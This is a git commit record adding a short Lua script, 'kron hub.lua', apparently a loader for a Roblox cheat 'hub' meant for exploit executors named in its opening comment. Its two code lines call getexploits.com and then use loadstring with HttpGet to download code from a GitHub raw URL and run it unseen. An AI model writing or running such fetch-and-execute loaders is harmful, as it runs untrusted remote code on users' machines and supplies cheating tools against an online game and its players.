24edfbcd736c190e840ac2fca9853f75fe44e422
kroniksdwdwd <ccvcvcvcv490@gmail.com>
2025-04-16 09:36:11 +1000

    Update kron hub.lua

---
+++ kron hub.lua
@@ -0,0 +1,5 @@
+-----xeno,delta,synapse,arceus,wave and others are worked-----
+
+game:HttpGet("https://getexploits.com/cexecution/767792090360074240")
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/DevKron/Kron_Hub/refs/heads/main/version_1.0'))("")
